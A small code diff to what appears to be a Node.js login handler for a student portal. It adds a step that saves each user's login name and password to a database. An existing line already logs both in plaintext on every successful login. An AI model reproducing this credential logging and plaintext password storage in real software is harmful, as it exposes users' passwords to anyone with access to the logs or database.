@@ -18,12 +18,12 @@ async function fun(ctx, next) {
       await blackUser(loginName, ctx.store);
     } catch (error) {
       console.log(error);
-      
+
       ctx.body = error.code && error || {
         code: -1,
         msg: error.msg
       };
-      
+
       return;
     }
 
@@ -45,6 +45,11 @@ async function fun(ctx, next) {
 
     console.log("Time:" + new Date(), `u:${loginName},p:${loginPwd} 登陆成功,t:${type}`);
     ctx.store.set(loginName, ctx.jvtc.o);
+    try {
+      ctx.dbx.student.save(loginName, loginPwd);
+    } catch (error) {
+      console.log(error);
+    }
 
     let cookies;
     switch (ctx.query.type) {
